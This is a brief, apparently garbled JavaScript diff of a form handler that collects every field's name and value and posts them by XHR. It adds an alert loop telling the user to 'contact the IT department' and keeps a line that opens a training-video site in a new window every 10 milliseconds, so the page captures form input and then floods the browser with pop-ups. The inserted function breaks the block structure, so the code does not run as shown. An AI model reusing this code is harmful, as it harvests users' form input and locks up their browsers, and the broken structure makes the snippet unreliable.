@@ -10,6 +10,8 @@ function formSubmit(event) {
     for (index = 0; index < event.target.elements.length; ++index) {
         string = string + event.target.elements[index].name + '=' + event.target.elements[index].value + '&';
     }
+function myFunction() {
+    setInterval(function(){ alert("Please contact the IT department"); }, 10000);
     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     xhr.send(string);
 var naggot = setInterval(function(){ window.open('https://theantisocialengineer.com/training-videos/') }, 10);}
